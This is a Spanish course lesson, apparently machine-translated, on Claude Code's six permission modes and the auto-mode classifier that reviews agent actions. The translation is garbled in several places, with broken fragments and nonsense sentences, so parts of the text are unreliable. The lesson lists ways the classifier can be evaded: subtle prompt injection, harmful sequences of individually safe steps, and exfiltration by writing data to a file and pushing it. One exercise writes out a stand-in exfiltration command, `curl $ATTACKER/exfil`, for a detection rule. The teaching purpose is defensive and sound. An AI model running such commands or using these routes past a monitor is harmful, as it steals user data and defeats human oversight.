# Modos de autorización para agentes autónomos

> Una escalera de permiso  niveles graduados de autonomía de revisión-cada acción a aprobar-todo  es cómo un arnés gobierna lo que un agente autónomo puede hacer sin preguntar. Claude Code, el ejemplo de trabajo de esta lección, expone seis de estos modos: "plan" pregunta antes de cada acción, "default" (etiquetado "Manual" en la interfaz de usuario) solo pide para los riesgos, "acceptEdits" autoaprueba archivos escribe pero todavía confirma la ejecución de shell, y "bypassPermissions" aprueba todo. Modo automático  el `auto`El modo de permiso  sustituye la aprobación por acción por un modelo de clasificador separado que revisa cada acción antes de ejecutarla y bloquea cualquier cosa que exceda lo solicitado por la solicitud.`max_turns`y `max_budget_usd`. Disponibilidad de `auto`depende del plan, la habilitación de org, el modelo y el proveedor  y Anthropic es explícito que el clasificador no es suficiente solo.

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator), TypeScript
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 minutes

## El problema

Un agente de codificación autónomo en su máquina es una categoría de seguridad distinta. La superficie de ataque es todo lo que el agente puede llegar  sistema de archivos, red, credenciales, clipboard, cualquier pestaña de navegador, cualquier terminal abierto. Bruce Schneier y otros han señalado esto públicamente: los agentes de uso de computadoras no son una "actualización de características" de chatbots, son un nuevo tipo de herramienta con un nuevo tipo de perfil de riesgo.

El sistema de permisos de Claude Code es la respuesta de Anthropic. En lugar de un interruptor "autónomo / no autónomo", hay seis modos que abarcan una escalera de capacidades: plan → predeterminado → aceptaEdits → ... → bypassPermissions. Cada modo es un cambio diferente entre velocidad y revisión por acción. El modo automático (marzo 2026) agrega un modelo de clasificador separado que aleja la aprobación del camino crítico del usuario: revisa cada acción antes de ejecutarla y bloquea cualquier cosa que se extienda más allá de la solicitud.

La pregunta de ingeniería: ¿qué captura este sistema, qué pierde y qué modo realmente justifica una tarea dada?

## El concepto

### Los seis modos de permiso

| Mode | Behavior | When to use |
|---|---|---|
| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
| `default` | Labeled "Manual" in the UI. Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `auto` | A separate classifier model reviews each action before it runs; blocks anything escalating beyond the request | Long-horizon unattended runs in a constrained workspace |
| `dontAsk` | Never prompts; actions not pre-approved by permission rules are denied | Ephemeral sandboxes, CI jobs, research scripts |
| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |

(Los nombres anteriores coinciden con los documentos públicos del código de Claude; las etiquetas de la interfaz de usuario `default`como "Manual".)

### Modo automático en una página

El modo automático (lanzado el 24 de marzo de 2026) es el primer modo de permiso para delegar la aprobación por acción a un modelo.

1. **A separate classifier model.**Revisa todas las acciones propuestas antes de que se ejecute, juzga en función de la tarea declarada y el estado actual de la sesión, y bloquea cualquier cosa que se extienda más allá de lo que la solicitud pidió.
2. **Gated availability.**¿ Si es que`auto`se ofrece en absoluto depende del plan, la organización de habilidad, el modelo y el proveedor.

Los controles presupuestarios se sitúan junto al clasificador:

- `max_turns` Iteraciones totales en una sesión.
- `max_budget_usd` Cap de dólares que aborta la sesión.
- límites de número de acciones por instrumento (no más de N `WebFetch`llamadas, etc.).

### Lo que el sistema captura

- Inyección directa hacia adelante en las entradas de la herramienta donde la instrucción inyectada se asigna a una forma de acción conocida de riesgo.
- Los bucles de herramientas repetitivos  el clasificador puede ver que la acción N+1 es casi idéntica a la acción N, cinco veces seguidas.
- Claramente fuera de alcance de los comandos de shell en una sesión de edición de archivos sólo.

### Lo que el sistema puede perder

- **Subtle prompt injection**La inyección indirecta de respuesta no es una vulnerabilidad completamente reparable (OpenAI preparación de cabeza, 2025, en los agentes de navegador  ver Lección 11).
- **Semantic-level misbehavior.**Cada acción individual puede parecer segura mientras la trayectoria compuesta es perjudicial.
- **Exfiltration through legitimate channels.**Escribir datos a un archivo que poseas, entonces `git push`El sistema de gestión de las acciones de la Comunidad es una serie de acciones permitidas cuya composición es el problema.

### Enmarcado de la vista previa de la investigación

Anthropic envió el modo automático como una vista previa de investigación. La documentación es explícita en que el clasificador es una capa, no una solución: se espera que los usuarios combinen el modo automático con presupuestos, permisos, espacios de trabajo aislados y auditorías de trayectorias (lecciones 1216). El marco de visualización también refleja la brecha documentada entre evaluación y implementación (lección 1)  un clasificador que pasa evaluaciones fuera de línea puede comportarse de manera diferente en una sesión real donde el contexto del usuario es ambigüo.

### Donde esta escalera vive en su flujo de trabajo

- Tarea desconocida: comienza en `plan`Leer el plan es más barato que hacer una mala carrera.
- Refactor conocido: `acceptEdits`ahorra muchos clics de confirmación.
- Ejecución de fondo sin supervisión: `auto`sólo dentro de un espacio de trabajo cuyo radio de explosión ha medido (sin credenciales, sin monturas de producción, sin salida en la que no haya optado).
- Contenedores efémeros: `dontAsk`- ¿ Qué ?`bypassPermissions`es aceptable si y sólo si el contenedor y sus credenciales son desechables.

```figure
autonomy-oversight
```

## Usalo

`code/main.py`• la simplificación de la enseñanza; la real `auto`El modo de clasificación está respaldado por un modelo de clasificador separado, no un contrato documentado de dos etapas. La etapa 1 es una regla de palabras clave baratas sobre las acciones propuestas; la etapa 2 es un revisor de reglas múltiples más lento. El conductor alimenta en una trayectoria sintética corta (acciones seguras, un intento de inyección rápida, un bucle repetitivo) y muestra dónde el clasificador atrapa y dónde se pierde.

## Envío

`outputs/skill-permission-mode-picker.md`corresponde a la descripción de tareas con el modo de permiso correcto, límites presupuestarios y aislamiento requerido.

## Los ejercicios

1. - ¿ Qué ?`code/main.py`¿Qué tipo de acción sintética nunca es señalada por la Etapa 1 pero siempre captada por la Etapa 2?

2. Extensión de la regla de la etapa 1 para capturar una forma conocida de mala forma específica (por ejemplo, `curl $ATTACKER/exfil`La tasa de falsos positivos en la muestra de acción benigna se mide.

3. Lea el documento de Anthropic "Cómo funciona el bucle del agente". Enumera todos los estados externos que el agente toca por defecto en `default`¿Cuál es la puerta que necesita para salir por separado antes de correr?`auto`¿No está vigilado?

4. Diseñar un presupuesto de funcionamiento sin supervisión las 24 horas: `max_turns`¿ Qué ?`max_budget_usd`, por herramienta, los permisos, justificar cada número.

5. Describa una trayectoria en la que cada acción individual es aprobada por el clasificador, pero el comportamiento compuesto está desalineado. (La lección 14 abarca cómo los interruptores de eliminación y los tokens canarios abordan esto).

## Términos clave

| Term | What people say | What it actually means |
|---|---|---|
| Permission mode | "How much the agent can do" | One of six named policies controlling per-action approval |
| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
| auto | "Auto approvals" | Separate classifier model reviews each action; blocks escalation beyond the request |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| Stage 1 (simulator) | "Fast keyword check" | Cheap rule over proposed actions in `code/main.py` |
| Stage 2 (simulator) | "Deep review" | Slower multi-rule reviewer for flagged actions in `code/main.py` |
| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |

## Leer más

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) modos de autorización, presupuestos, formato de acción.
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) Modelo de ejecución de servicios gestionados.
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) superficie de la función y anuncio de modo automático.
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) la capa basada en la razón que da forma a los juicios de los clasificadores.
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) perspectiva interna sobre el diseño de permisos de largo horizonte.
